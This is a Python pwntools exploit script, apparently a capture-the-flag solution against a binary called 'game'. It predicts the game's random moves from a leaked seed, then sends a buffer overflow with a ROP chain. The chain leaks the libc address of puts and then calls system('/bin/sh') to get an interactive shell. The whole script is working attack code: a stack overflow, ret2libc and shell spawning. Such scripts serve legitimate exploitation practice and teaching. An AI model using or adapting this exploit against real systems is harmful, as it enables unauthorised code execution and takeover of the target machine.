#!/usr/bin/env python3

from pwn import *
import random
import ctypes

exe = ELF("game_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["ghostty", "-e", "bash", "-c"]

gs = '''
 b *main+31
b *main+598
c
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    elif args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        r = remote("addr", 1337)

    return r

libc2 = ctypes.CDLL("libc.so.6")
rop_exe = ROP(exe)

# syscall = rop_exe.find_gadget(['syscall'])[0]

def show_logs():
  r.sendline(b"3")
  for i in range(14):
    r.recvline()

  r.recvuntil(b"token: ")
  return int(r.recvuntil(b")")[:-1])

def win():
  for i in range (0x1f):
    bot_move = libc2.rand() % 3
    my_move = (bot_move + 1) % 3
    r.sendline(str(my_move).encode())
  r.recvuntil(b"Password : ")

r = conn()

seed = show_logs()
libc2.srand(seed)
libc2.rand()

win()

payload = b"A" * 64 + b"B" * 96

r.send(b"A" * 200 + p64(0x4011d6) + p64(0x403f98) + p64(0x401040) + p64(0x4013db))
r.recvline()
r.recvline()

leak = u64(r.recvn(6) + b"\x00" * 2) - libc.symbols['puts']
libc.address = leak

r.recvline()

seed = show_logs()
libc2.srand(seed)
libc2.rand()

win()

binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

r.send(b"A" * 200 + p64(0x401016) + p64(0x4011d6) + p64(binsh) + p64(system))


r.interactive()
